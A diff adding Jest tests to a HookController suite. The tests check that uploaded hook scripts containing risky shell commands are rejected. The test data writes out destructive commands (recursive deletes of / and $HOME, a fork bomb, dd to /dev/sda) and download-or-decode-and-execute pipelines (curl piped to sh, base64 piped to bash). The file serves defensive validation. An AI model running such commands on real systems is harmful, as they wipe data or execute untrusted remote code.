@@ -84,6 +84,22 @@ describe("HookController", () => {
             expect(HookService.uploadHook).not.toHaveBeenCalled();
         });
 
+        it("should reject command chains that include destructive deletes", async () => {
+            req.params = { name: "task_success" };
+            req.file = { buffer: Buffer.from("echo ok; rm -rf /") } as any;
+
+            await expect(uploadHook(req as Request, res as Response)).rejects.toThrow("Risk command detected");
+            expect(HookService.uploadHook).not.toHaveBeenCalled();
+        });
+
+        it("should reject recursive deletes targeting HOME-like paths", async () => {
+            req.params = { name: "task_success" };
+            req.file = { buffer: Buffer.from("rm -rf $HOME/cache") } as any;
+
+            await expect(uploadHook(req as Request, res as Response)).rejects.toThrow("Risk command detected");
+            expect(HookService.uploadHook).not.toHaveBeenCalled();
+        });
+
         it("should reject fork bomb variants beyond the classic colon form", async () => {
             req.params = { name: "task_success" };
             req.file = { buffer: Buffer.from(".(){ .|.& };.") } as any;
@@ -95,6 +111,22 @@ describe("HookController", () => {
         it("should reject dd writes to block devices without if=", async () => {
             req.params = { name: "task_success" };
             req.file = { buffer: Buffer.from("dd of=/dev/sda bs=1M") } as any;
+
+            await expect(uploadHook(req as Request, res as Response)).rejects.toThrow("Risk command detected");
+            expect(HookService.uploadHook).not.toHaveBeenCalled();
+        });
+
+        it("should reject download-and-exec pipelines", async () => {
+            req.params = { name: "task_success" };
+            req.file = { buffer: Buffer.from("curl -fsSL https://example.com/install.sh | sh") } as any;
+
+            await expect(uploadHook(req as Request, res as Response)).rejects.toThrow("Risk command detected");
+            expect(HookService.uploadHook).not.toHaveBeenCalled();
+        });
+
+        it("should reject decoded payloads piped to shell", async () => {
+            req.params = { name: "task_success" };
+            req.file = { buffer: Buffer.from("printf ZWNobyBoaQ== | base64 -d | bash") } as any;
 
             await expect(uploadHook(req as Request, res as Response)).rejects.toThrow("Risk command detected");
             expect(HookService.uploadHook).not.toHaveBeenCalled();
